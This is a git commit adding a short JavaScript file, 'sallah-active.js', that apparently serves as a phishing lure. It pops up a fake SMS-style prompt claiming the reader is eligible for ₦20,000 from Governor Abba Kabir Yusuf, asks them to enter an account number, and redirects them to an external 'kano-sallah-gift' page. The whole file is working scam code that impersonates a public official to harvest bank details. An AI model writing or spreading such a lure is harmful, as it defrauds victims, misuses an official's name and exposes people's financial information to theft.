6a279b603774e5ae1273323ec0ed714f3569832b
rmadamgspec <g5mqnsm8zn@privaterelay.appleid.com>
2026-05-26 23:26:06 +0100

    Create sallah-active.js

---
+++ sallah-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦20,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦20,000 From Gov Abba Kabir Yusuf, click OK to Enter Your Acc. Number','WITHDRAW ₦20,000');
+if (password != 'WITHDRAW ₦20,000') {
+location.href='https://offresargen.info/kano-sallah-gift.html';
+}
